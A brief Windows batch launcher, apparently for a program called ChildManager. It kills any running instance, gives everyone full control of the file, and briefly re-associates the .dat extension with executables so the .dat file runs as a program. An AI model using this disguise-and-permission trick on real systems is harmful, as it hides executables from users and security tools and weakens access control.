set taskname=ChildManager.dat
tasklist|find /i "%taskname%" ||goto :run
taskkill /f /im "%taskname%"
goto :run
:run
cacls %~dp0ChildManager.dat /E /G everyone:F
assoc.dat=exefile
start "" %~dp0ChildManager.dat
assoc.dat=file